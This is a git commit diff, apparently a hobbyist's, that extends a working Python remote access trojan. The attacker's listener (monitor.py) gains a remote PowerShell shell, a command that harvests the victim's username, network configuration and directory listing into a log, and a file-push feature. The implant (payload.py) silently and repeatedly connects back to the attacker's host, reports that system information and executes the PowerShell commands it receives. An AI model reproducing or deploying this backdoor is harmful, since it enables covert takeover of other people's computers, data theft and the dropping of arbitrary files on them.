15e29e743854dd171db583a9fc31ac79eb9510d2
LeLaboDuGame <ad2015adrien@gmail.com>
2025-05-10 22:35:18 +0200

    -Adding a push function -Correcting some bugs !

--- monitor.py
+++ monitor.py
@@ -1,8 +1,11 @@
+import os
 import socket
 import time
 
 HOST = ""
-PORT = 21213
+PORT = 21214
+
+BUFFER_SIZE = 1024
 
 # OPEN THE CONNECTION
 server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -15,8 +18,21 @@ user, addr = server.accept()
 print(f"CONNECTED ! ADDR:{addr} ! WELL PIRATED !!!!!!!!")
 data = user.recv(1024).decode()
 print(f"Welcome data: \n\n{data}\n")
+data = user.recv(1024 * 32).decode().split("|")
+print(data)
+userlogin, ipconfig, actualVdir = data
 
 cd = "./"
+
+
+def check_receive(user):
+    rtn = user.recv(1024).decode()
+    if rtn == "OK":
+        return
+    else:
+        print(f"RETURNING SOMETHING ELSE: {user} ! 'OK' PACKET NOT RECEIVE !")
+        return
+
 
 is_server_on = True
 while is_server_on:
@@ -24,23 +40,76 @@ while is_server_on:
     if cmd == "quit":
         is_server_on = False
         user.send("disconnect".encode())
+        check_receive(user)
 
     if cmd == "pwshl":
         while True:
-            sd = input("What do you want to send ? >>> ")
+            sd = input("?reset: reset path to ./\n?cd <paht>: addd path to cd (cd += path)\n\nWhat do you want to send ? >>> ")
             if "?reset" in sd:
                 cd = "./"
                 pass
             if "?cd " in sd:
-                cd = sd.replace("?cd ", "")
+                cd += sd.replace("?cd ", "")
                 print(f"The directory is now: {cd}")
                 pass
             if sd == "EXIT":
                 break
 
             user.send("pwshl".encode())
+            check_receive(user)
             time.sleep(0.2)
             sd = f"cd {cd};{sd}"
             user.send(sd.encode())
+            check_receive(user)
             data = user.recv(1024 * 32).decode()
             print(f"USER: {data}")
+
+    if cmd == "fish":
+        with open(f"{userlogin}-{addr[0]}.log", "w") as file:
+            separator = "\n-----------------------------------------------------------------------------------\n"
+            file.write(f"Userlogin: {userlogin}\n"
+                       f"{separator}IP Config:\n"
+                       f"{ipconfig}\n"
+                       f"{separator}Actual Virus Directory:\n"
+                       f"{actualVdir}")
+
+    if cmd == "push":
+
+        filename = input("You request to push a file !\n"
+                         "What is the name of the file located on ./pushable/ >>> ")
+        path = f"./pushable/{filename}"
+        if os.path.exists(path):
+            print("File found starting pushing !")
+
+            user.send("pushfile".encode())
+            check_receive(user)
+            user.send(str(BUFFER_SIZE).encode())
+            check_receive(user)
+            user.send(filename.encode())
+            check_receive(user)
+            file = open(path, "r")
+            i = 0
+            while True:
+                l = file.read(BUFFER_SIZE)
+                if l:
+                    print(f"Sending block {i}")
+                    user.send(l.encode())
+                    check_receive(user)
+                    print("OK")
+                    i += 1
+                if not l:
+                    user.send("||END OF THE TRANSMISSION !||".encode())
+                    check_receive(user)
+                    break
+            file.close()
+            print("\nPush complete !")
+
+        else:
+            print("File not found !")
+
+    if cmd == "help":
+        print(f"Help:\n"
+              f"quit: disconnect\n"
+              f"pwshl: init a remote pwshl\n"
+              "fish: download simple data (ip, username, path of the virus, ...) and save in ./{userid}.log\n"
+              "push: push a file to the target !\n")
--- payload.py
+++ payload.py
@@ -2,51 +2,102 @@ import os
 import socket
 import subprocess
 import time
-import os
+
 from dotenv import load_dotenv
 
 load_dotenv()
 
 HOST = open(".env", "r+").read()
-PORT = 21213
+PORT = 21214
 
+def send_ok(sock):
+    sock.send("OK".encode())
+def powershell(data):
+    return subprocess.check_output(f"powershell {data}", shell=True).decode("ansi")
 
 
 # OPEN THE CONNECTION
-sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-print("Waiting in silent to connect !")
-while True:
-    try:
-        sock.connect((HOST, PORT))
-        break
-    except TimeoutError:
-        print("Connection timed out, trying again...")
-        time.sleep(5)
-        continue
 
-print("Connected !")
-time.sleep(0.2)
-# sending welcome packet !
-print("Sending welcome packet !")
-sock.send(
-    f"Hello I'm a victim and I like to share you information about me !\nMy name is: {os.getlogin()}".encode())
 
 MAX_BYTE = 4 * 1024
 
-while True:
-    print("Waiting for cmd !")
-    cmd = sock.recv(MAX_BYTE).decode()
-    if cmd == "disconnect":
-        sock.close()
-        break
 
-    if cmd == "pwshl":
-        data = sock.recv(MAX_BYTE).decode()
+def wait_in_silent():
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    print("Waiting in silent to connect !")
+    while True:
         try:
-            rtn = subprocess.check_output(f"powershell {data}", shell=True).decode("ansi")
-        except subprocess.CalledProcessError:
-            rtn = "Error executing command!"
-        except:
-            rtn = "An error in the command executer occurred !"
-        print(f"CMD: {rtn}")
-        sock.send(rtn.encode())
+            sock.connect((HOST, PORT))
+            break
+        except TimeoutError:
+            print("Connection timed out, retrying in 5sec...")
+            time.sleep(5)
+            continue
+        except ConnectionRefusedError:
+            print("Connection refused by host. Retrying in 5sec...")
+            time.sleep(5)
+    print("Connected !")
+    time.sleep(0.2)
+    # sending welcome packet !
+    print("Sending welcome packet !")
+    sock.send(
+        f"Hello I'm a victim and I like to share you information about me !\nMy name is: {os.getlogin()}".encode())
+    sock.send(f"{os.getlogin()}|{powershell('ipconfig')}|{powershell('dir')}".encode())
+    return sock
+
+
+while True:
+    sock = wait_in_silent()
+
+    while True:
+        try:
+            print("Waiting for cmd !")
+            cmd = sock.recv(MAX_BYTE).decode()
+            send_ok(sock)
+            if cmd == "disconnect":
+                print("Monitor ask to quit ! Closing !")
+                sock.close()
+                break
+
+            if cmd == "pwshl":
+                data = sock.recv(MAX_BYTE).decode()
+                send_ok(sock)
+                try:
+                    rtn = powershell(data)
+                except subprocess.CalledProcessError:
+                    rtn = "Error executing command!"
+                except:
+                    rtn = "An error in the command executer occurred !"
+                print(f"CMD: {rtn}")
+                sock.send(rtn.encode())
+
+            if cmd == "pushfile":
+                print("Starting receiving file !")
+                BUFFER_SIZE = int(sock.recv(MAX_BYTE).decode())
+                send_ok(sock)
+                file_name = sock.recv(MAX_BYTE).decode()
+                send_ok(sock)
+
+                print("Starting download !")
+                file = open(file_name, "w")
+                l = ""
+                i = 0
+                while True:
+                    l = sock.recv(BUFFER_SIZE).decode()
+                    if l != "||END OF THE TRANSMISSION !||":
+                        file.write(l)
+                        print(f"Block {i} receive !")
+                        i += 1
+                    else:
+                        send_ok(sock)
+                        break
+                    send_ok(sock)
+                file.close()
+                print("Download finished !")
+
+        except ConnectionResetError:
+            print("The connection has been interrupt... Closing!")
+            sock.close()
+            break
+    print("Waiting 5 seconds...")
+    time.sleep(5)
